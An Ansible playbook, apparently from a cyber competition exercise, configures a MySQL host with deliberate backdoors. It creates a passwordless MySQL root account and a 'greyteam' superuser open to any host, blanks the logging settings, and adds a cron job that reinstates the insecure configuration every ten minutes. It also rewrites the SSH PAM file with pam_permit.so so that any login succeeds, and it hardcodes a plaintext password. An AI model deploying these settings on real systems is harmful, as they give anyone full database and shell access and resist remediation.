---
- name: Configure MySQL Service
  hosts: sql
  vars:
    ansible_python_interpreter: /usr/bin/python3
    ansible_become_password: SteveSexy!
  become: true
  tasks:
  - name: "Configuring Hostname"
    ansible.builtin.hostname:
      name: "Forest"
    become: true
    
  - name: Install PyMySQL
    apt:
      name: python3-pymysql
      update_cache: yes
      state: present
      
  - name: Install MySQL-Server
    apt:
      name: mysql-server
      update_cache: yes
      state: present
      
  - name: Create backup directory
    ansible.builtin.file:
      path: /root/.my_config_backup
      state: directory
      mode: 0755
      
  - name: Deploy initial MySQL configuration (skip-grant-tables)
    copy:
      dest: /etc/mysql/mysql.conf.d/mysqld.cnf
      content: |
        [mysqld]
        bind-address = 0.0.0.0
        skip-symbolic-links = 0
        skip-grant-tables = 1
        skip-networking = 0
        port = 3306
        log_error = ""
        log_bin = ""
        general_log = 0
        general_log_file = ""
        
  - name: Restart MySQL with skip-grant-tables
    service:
      name: mysql
      state: restarted
      
  - name: Create .my.cnf file for root user
    copy:
      dest: /root/.my.cnf
      content: |
        [client]
        user=root
        host=localhost
      mode: '0600'
      
  - name: Create MySQL configuration (without skip-grant-tables)
    copy:
      dest: /etc/mysql/mysql.conf.d/mysqld.cnf
      content: |
        [mysqld]
        bind-address = 0.0.0.0
        skip-symbolic-links = 0
        skip-networking = 0
        port = 3306
        log_error = ""
        log_bin = ""
        general_log = 0
        general_log_file = ""
        
  - name: Restart MySQL without skip-grant-tables
    service:
      name: mysql
      state: restarted
      
  - name: Allow connections from any host for root
    mysql_user:
      name: root
      host: '%'
      password: ''
      priv: '*.*:ALL,GRANT'
      state: present
      login_user: root
      login_host: localhost
      login_unix_socket: /var/run/mysqld/mysqld.sock
      
  - name: Create greyteam user with full privileges
    mysql_user:
      name: greyteam
      host: '%'
      password: 'SteveSexy!'
      priv: '*.*:ALL,GRANT'
      state: present
      login_user: root
      login_host: localhost
      login_unix_socket: /var/run/mysqld/mysqld.sock

  - name: Create backup of final MySQL configuration
    copy:
      src: /etc/mysql/mysql.conf.d/mysqld.cnf
      dest: /root/.my_config_backup/mysqld.cnf.bak
      remote_src: yes
      
  - name: Ensure MySQL remains accessible every 10 minutes
    cron:
      name: "Restore MySQL config"
      minute: "*/10"
      job: "cp /root/.my_config_backup/mysqld.cnf.bak /etc/mysql/mysql.conf.d/mysqld.cnf && systemctl restart mysql"
      
  - name: Configure PAM to allow any authentication
    copy:
      dest: /etc/pam.d/sshd
      content: |
        # PAM configuration for the Secure Shell service
        
        # Allow authentication for all users without passwords
        auth sufficient pam_permit.so
        
        # Standard Un*x authentication
        @include common-auth
        
        # Disallow non-root logins when /etc/nologin exists
        account    required     pam_nologin.so
        
        # Standard Un*x account and session
        @include common-account
        @include common-session
        @include common-password
        
        # SELinux needs to be the first session rule
        session [success=ok ignore=ignore module_unknown=ignore default=bad] pam_selinux.so close
        session required pam_env.so readenv=1
        session required pam_env.so readenv=1 envfile=/etc/default/locale
        session optional pam_keyinit.so force revoke
        session optional pam_motd.so motd=/run/motd.dynamic
        session optional pam_motd.so noupdate
        session optional pam_mail.so standard noenv
        session [success=ok ignore=ignore module_unknown=ignore default=bad] pam_selinux.so open
        
  - name: Restart SSH service
    service:
      name: ssh
      state: restarted
